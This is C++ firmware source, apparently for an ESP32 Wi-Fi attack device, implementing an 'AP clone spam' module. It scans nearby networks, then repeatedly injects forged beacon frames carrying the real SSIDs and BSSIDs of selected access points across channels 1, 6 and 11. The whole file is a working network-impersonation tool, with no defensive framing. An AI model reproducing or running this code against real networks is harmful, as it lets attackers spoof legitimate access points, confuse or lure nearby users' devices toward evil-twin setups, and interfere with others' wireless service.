#include "ap_clone_spam.h"
#include <string.h>

static uint8_t clone_pkt[109] = {
  0x80,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x00,0x00,
  0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,
  0xe8,0x03, 0x31,0x00, 0x00,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,
  0x03,0x01,0x01,
  0x30,0x18,0x01,0x00,0x00,0x0f,0xac,0x02,
  0x02,0x00,0x00,0x0f,0xac,0x04,0x00,0x0f,
  0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,
  0x00,0x00
};
static char clone_empty[32];

void APCloneSpam::begin() {
  _count=0; _running=false; _scanning=false; _sent=0;
  for(int i=0;i<32;i++) clone_empty[i]=' ';
  clone_pkt[34]=0x31;
}

int APCloneSpam::scan() {
  _scanning=true; _count=0;
  Serial.println("APClone: scanning...");
  int found = WiFi.scanNetworks(false, true);
  if(found<=0){ _scanning=false; return 0; }
  _count = min(found, MAX_CLONE_APS);
  for(int i=0;i<_count;i++){
    strncpy(_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
    _aps[i].ssid[32]='\0';
    memcpy(_aps[i].bssid, WiFi.BSSID(i), 6);
    _aps[i].rssi     = WiFi.RSSI(i);
    _aps[i].selected = false;
    Serial.printf("  [%d] %s (%ddBm)\n", i, _aps[i].ssid, _aps[i].rssi);
  }
  WiFi.scanDelete();
  _scanning=false;
  Serial.printf("APClone: found %d networks\n", _count);
  return _count;
}

void APCloneSpam::select(int idx, bool on) {
  if(idx>=0 && idx<_count) _aps[idx].selected=on;
}
void APCloneSpam::selectAll()      { for(int i=0;i<_count;i++) _aps[i].selected=true;  }
void APCloneSpam::clearSelection() { for(int i=0;i<_count;i++) _aps[i].selected=false; }

bool APCloneSpam::start() {
  int sel=getSelectedCount();
  if(sel==0){ Serial.println("APClone: no APs selected"); return false; }
  _sent=0; _chIdx=0; _lastTx=0; _lastLog=0; _running=true;
  Serial.println("APClone: starting — cloning selected APs:");
  for(int i=0;i<_count;i++)
    if(_aps[i].selected)
      Serial.printf("  -> %s\n", _aps[i].ssid);
  return true;
}

void APCloneSpam::stop() {
  _running=false;
  Serial.printf("APClone: stopped after %d broadcasts\n", _sent);
}

void APCloneSpam::tick() {
  if(!_running) return;
  uint32_t now=millis();
  if(now-_lastTx<100) return;
  _lastTx=now;

  static const uint8_t CH[]={1,6,11};
  esp_wifi_set_channel(CH[_chIdx%3], WIFI_SECOND_CHAN_NONE);
  _chIdx++;

  for(int s=0;s<_count;s++){
    if(!_aps[s].selected) continue;

    // Use real BSSID from the actual AP
    memcpy(&clone_pkt[10], _aps[s].bssid, 6);
    memcpy(&clone_pkt[16], _aps[s].bssid, 6);
    memcpy(&clone_pkt[38], clone_empty, 32);
    int sLen=strlen(_aps[s].ssid); if(sLen>32)sLen=32;
    memcpy(&clone_pkt[38], _aps[s].ssid, sLen);
    clone_pkt[82]=CH[_chIdx%3];

    for(int r=0;r<3;r++){
      if(esp_wifi_80211_tx(WIFI_IF_STA,clone_pkt,sizeof(clone_pkt),false)==ESP_OK)
        _sent++;
      delay(1);
    }
  }

  // Log every 5 seconds which APs are being cloned
  if(now-_lastLog>5000){
    _lastLog=now;
    Serial.printf("APClone: broadcasting %d APs | total sent=%d\n",
                  getSelectedCount(), _sent);
    for(int i=0;i<_count;i++)
      if(_aps[i].selected)
        Serial.printf("  -> '%s'\n", _aps[i].ssid);
  }
}
